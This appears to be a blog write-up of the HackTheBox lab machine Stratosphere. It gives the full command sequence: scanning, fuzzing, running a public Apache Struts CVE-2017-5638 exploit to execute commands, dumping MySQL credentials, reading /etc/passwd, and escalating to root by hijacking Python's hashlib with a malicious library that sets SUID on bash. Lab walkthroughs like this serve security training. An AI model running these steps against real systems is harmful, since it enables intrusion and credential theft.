---
title: Stratosphere
date: 2026-03-22
categories: [CTFs, HackTheBox]
tags: [linux, wfuzz, cve-2017-5638, apache-struts, mysqlshow, mysql, sudo, python-library-hijacking]
media_subpath: /assets/img/HackTheBox/Stratosphere
image: 
    path: Stratosphere.webp
    lqip: data:image/webp;base64,UklGRlYAAABXRUJQVlA4IEoAAABwAwCdASoUAAsAPzmEuVOvKKWisAgB4CcJZQAAQvQUsVs0osAA/ujxEdHmjK2bKrXpSY1haEbHXW0fZXTcsLoMTsyDn2/KhFJQAA==
    alt: Info Card
---

## Summary

[Stratosphere](https://www.hackthebox.com/machines/stratosphere){: target="_blank" } is a medium Linux machine centered on exploiting the Apache Struts 2 framework. Initial access is gained by exploiting CVE-2017-5638 in an outdated version of the framework. Due to the system's restrictions, the most efficient path is to enumerate directly through the exploit vector to dump a backend database. After extracting credentials, a pivot to a local user provides the foothold needed to exploit a Python library hijacking vulnerability for root access.

## Port Scanning

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.129.60.226 -oN allports
```

![Nmap Port Scan](image_1.webp)
_Full TCP Scan_

## Service Detection

```bash
nmap -p22,80,8080 -sCV 10.129.60.226 -oN services
```

![Nmap Scripts](image_2.webp)
_Nmap Default Scripts & Versions_

## Port 80 & 8080 Enumeration

Basically the same service is running on both ports and it looks like a simple page with no functionality.

![Whatweb](image_3.webp)
_Basic Info of pages_

![Static Page](image_4.webp)
_Home Page_

![Under Construction](image_5.webp)
_Under Construction_

### Fuzzing

We will use `wfuzz` to find interesting endpoints:

```bash
wfuzz -c --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 http://10.129.60.226/FUZZ
```

![Fuzzing](image_6.webp)
_Finding endpoints_

We found two directories but the interesting one is **Monitoring**  which has a `.action` extension that looks suspicious.

![Apache Struts](image_7.webp)
_.action file_

After searching about that extension we found that there is a **CVE** for **Apache Struts** that can let us run commands remotely.

![CVE-2017-5638](image_8.webp)
_Apache Struts RCE_

## Apache Struts RCE | CVE-2017-5638

Here is the [Github Repository](https://github.com/mazen160/struts-pwn){: target="_blank" } of the exploit we will use.

```bash
git clone https://github.com/mazen160/struts-pwn
```

![Apache Struts Exploit](image_9.webp)
_Getting the exploit_

Using the exploit is very simple, we have to pass the **url** and the **command** we want to execute as argument. So let's test it with an `id`:

![Help Panel](image_10.webp)
_Help Panel_

We can see the output of the `id` command, so the exploit works perfectly.

```bash
python3 struts-pwn.py -u http://10.129.60.226/Monitoring/example/Welcome.action -c 'id'
```

![RCE](image_11.webp)
_Running id on the target_

Since getting a shell is tricky due to hardening, we will enumerate the box using this exploit. The **db_connect** file looks interesting so let's check its content:

```bash
python3 struts-pwn.py -u http://10.129.60.226/Monitoring/example/Welcome.action -c 'ls -la'
```

![Listing Files](image_12.webp)
_db_connect file_

```bash
python3 struts-pwn.py -u http://10.129.60.226/Monitoring/example/Welcome.action -c 'cat db_connect'
```

![Databse Creds](image_13.webp)
_MySQL credentials_

We found credentials for the database so let's enumerate it by using these commands: `mysql` and `mysqlshow`.

![mysql & mysqlshow](image_14.webp)
_mysql & mysqlshow_

### Enumeration Using mysqlshow

We are going to start by looking at the databases present in the system:

```bash
python3 struts-pwn.py -u http://10.129.60.226/Monitoring/example/Welcome.action -c 'mysqlshow -uadmin -padmin'
```

![Databases](image_15.webp)
_Using mysqlshow to show databases_

Then we will see the **tables** of the **users** database:

```bash
python3 struts-pwn.py -u http://10.129.60.226/Monitoring/example/Welcome.action -c 'mysqlshow -uadmin -padmin users'
```

![Tables](image_16.webp)
_Tables of users database_

Finally, we will check the structure of the **accounts** table from the **users** database:

```bash
python3 struts-pwn.py -u http://10.129.60.226/Monitoring/example/Welcome.action -c 'mysqlshow -uadmin -padmin users accounts'
```

![Columns](image_17.webp)
_Accounts table structure_

### Dumping Database Info

Now we are going to use `mysql` to see the content of the **accounts** table. Since we don't have a shell we can not enter to the interactive mode of mysql, so then we must execute the query in a one-liner command.

```bash
python3 struts-pwn.py -u http://10.129.60.226/Monitoring/example/Welcome.action -c 'mysql -uadmin -padmin -e "select * from accounts" users'
```

![Dumping Data](image_18.webp)
_Dumping data using mysql_

We found a credential and if we look at the **/etc/passwd** file we can notice the user **richard** exists on this box. So we will try to use ssh to connect to the target machine using this credential:

![Passwd File](image_19.webp)
_Reading /etc/passwd_

![SSH Access](image_20.webp)
_Initial Access via ssh_

## Privilege Escalation - Python Library Hijacking

Using `sudo -l`, we found that **richard** has a SUDOERS permission.

![SUDO](image_21.webp)
_SUDOERS permission_

We can run `python` to execute the **test.py** script as root. Looking and its permissions we notice that we can not modify it. So let's run it to check what it does:

![Permissions](image_22.webp)
_Permission on test.py_

![Demo](image_23.webp)
_Running the script as expected_


Since we can not modify the script as we want, we must try other ways to elevate our privileges. Looking at the content of **test.py** script we can notice it is using **hashlib library**. This is dangerous because we can create our custom library and hijack Python's Path so it will use our malicious library. This technique is known as **Library Hijacking**.

![Library](image_24.webp)
_Hashlib is being imported_

If we run the following command it will display the path Python will use when searching for the libraries we import in our scripts. As you can see in the image below, the first space is empty which means that Python will first look for the library in the current path where the script is located. Look at this [article](https://www.hackingarticles.in/linux-privilege-escalation-python-library-hijacking/){: target="_blank" } to learn more about it.

```bash
python3 -c 'import sys; print(sys.path)'
```

![Library Path](image_25.webp)
_Python's Library Path_

In order to get root access, we are going to create our malicious library in **richard's home directory** because it is where the script is located. We have to name it as the library we want to hijack, in this case **hashlib.py**. Then we have to add our instructions in the malicious library, for this demonstration we are going to add the SUID permission to the bash. Finally, we just have to run the command. As shown below, we successfully hijack the library and change the permissions on the `/bin/bash`.

![Hijacking](image_26.webp)
_Python Library Hijacking_

Now we just have to run `bash -p` and we will be root:

![Root Shell](image_27.webp)
_Shell as root_

## Flags

- [x] **user.txt**

```bash
cat /home/richard/user.txt 
ad2**************************360
```

- [x] **root.txt**

```bash
cat /root/root.txt 
979**************************efa
```

<h2 style="text-align:center;">Thanks for following along! Stay tuned for the next post. 🚀 ✍️ </h2>
{: data-toc-skip='' .mt-4 .mb-0 }
